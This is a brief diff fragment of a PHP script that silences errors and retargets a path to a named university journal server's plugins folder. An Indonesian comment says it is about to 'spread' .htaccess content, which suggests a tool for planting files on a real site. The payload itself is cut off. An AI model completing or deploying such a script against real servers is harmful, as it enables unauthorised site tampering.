@@ -6,7 +6,7 @@ set_time_limit(0);
 error_reporting(0);
 
 // Path target (folder plugins)
-$targetPath = '/www/wwwroot/journal1.uinssc.ac.id/public/';
+$targetPath = '/www/wwwroot/journal2.uinssc.ac.id/plugins/';
 
 // Isi .htaccess yang mau disebar (sesuai permintaan lu)
 $htaccessContent = '
